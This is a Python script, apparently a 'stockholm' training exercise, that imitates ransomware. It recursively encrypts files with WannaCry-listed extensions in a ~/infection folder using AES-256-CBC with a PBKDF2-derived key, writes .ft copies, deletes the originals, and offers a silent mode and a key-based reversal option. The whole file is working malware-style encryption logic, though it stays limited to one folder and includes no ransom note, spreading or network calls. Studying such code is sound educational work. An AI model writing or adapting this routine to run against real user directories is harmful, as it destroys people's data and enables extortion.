import os
import sys
import argparse
from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


VERSION = "1.0.0"
DIRECTORY = Path(Path.home() / "infection")
silentMode = False

# List of WannaCry targeted file extensions
targeted_extensions = {
    # Documents
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".txt",
    # Images
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
    # Archives
    ".zip", ".rar", ".7z", ".tar", ".gz",
    # Database files
    ".sql", ".accdb", ".mdb",
    # Other
    ".py", ".c", ".cpp", ".cs", ".html", ".css", ".js", ".php"
}

def logs(message):
    global silentMode

    if not silentMode:
        print(message)

def check_file_extension(file_path):
    return os.path.splitext(file_path)[1].lower() in targeted_extensions

def derive_key(password, salt):
    # Generate a key from the 16-character password usingPBKDF2HMAC with SHA256
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # AES-256 requires 32 bytes
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_file(file_path, password):
    logs(f"encryption process started for {file_path}")

    #generate a 16-byte salt && iv
    salt = os.urandom(16)
    iv = os.urandom(16)

    key = derive_key(password, salt)

     # Read the file's content
    with open(file_path, 'rb') as f:
        file_data = f.read()

     # Apply padding to the file data (AES requires data to be a multiple of block size)
    padder = padding.PKCS7(128).padder()  # 128 bits = 16 bytes block size
    padded_data = padder.update(file_data) + padder.finalize()

    # Initialize AES CBC cipher
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Encrypt the data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Write the encrypted data to a new file
    encrypted_file_path = str(file_path) + '.ft'
    with open(encrypted_file_path, 'wb') as f:
        # Write the salt, IV, and encrypted data to the file
        f.write(salt + iv + encrypted_data)
    logs(f"File encrypted successfully! Saved as {encrypted_file_path}\n")

    os.remove(file_path)

def decrypt_file(file_path, password):
    logs(f"decryption process started for {file_path}")

    # Read the encrypted file
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    # Extract salt, IV, and encrypted data from the file
    salt = file_data[:16]
    iv = file_data[16:32]
    encrypted_data = file_data[32:]

    # Derive the AES key from the password and salt
    key = derive_key(password, salt)

    # Initialize AES CBC cipher for decryption
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

    # Write the decrypted data to a new file
    decrypted_file_path = file_path.with_suffix('')
    with open(decrypted_file_path, 'wb') as f:
        f.write(unpadded_data)

    logs(f"File decrypted successfully! Saved as {decrypted_file_path}\n")
    os.remove(file_path)

def decryption_process(file_path, key):
    if os.path.splitext(file_path)[1].lower() == '.ft':
        logs(f"decrypting {file_path}")
        decrypt_file(file_path, key)
    else:
        logs(f"ignoring {file_path}\n")

def encryption_process(file_path, key):
    if check_file_extension(file_path):
        logs(f"encrypting {file_path}")
        encrypt_file(file_path, key)
    else:
        logs(f"ignoring {file_path}\n")

def process_directories(args):
    if args.reverse:
        logs(f"Decrypting infection folder with key: {args.reverse}\n")
        for file_path in DIRECTORY.rglob('*'):
            if file_path.is_file():
                decryption_process(file_path, args.reverse)
        logs(f"Finished decrypting infection folder:\n")
    else:
        logs(f"Encrypting infection folder:\n")
        for file_path in DIRECTORY.rglob('*'):
            if file_path.is_file():
                encryption_process(file_path, args.password)
        logs(f"Finished encrypting infection folder:\n")

def args_parser():
    parser = argparse.ArgumentParser(description='Encrypt or reverse infection in files.')
    
    # Adding command-line arguments
    parser.add_argument('-v', '--version', action='version', version=f'%(prog)s {VERSION}')
    parser.add_argument('-r', '--reverse', metavar='KEY', help='Reverse the infection using the specified KEY.')
    parser.add_argument('-p', '--password', metavar='KEY', help='Encrypt the infection using the specified KEY.')
    parser.add_argument('-s', '--silent', action='store_true', help='Run silently without outputting encrypted file names.')

    return parser.parse_args()

def main():
    if len(sys.argv) == 1:
        sys.exit(print("usage: stockholm.py [-h] [-v] [-r KEY] [-p KEY] [-s]\n"))

    global silentMode
    
    args = args_parser()

    silentMode = args.silent

    if args.password:
        if len(args.password) < 16:
            sys.exit(logs("password must be at least 16 characters long.\n"))
    
    if not silentMode:
        logs("Running in normal mode...\n")

    process_directories(args)

    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        if not silentMode:
            print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)
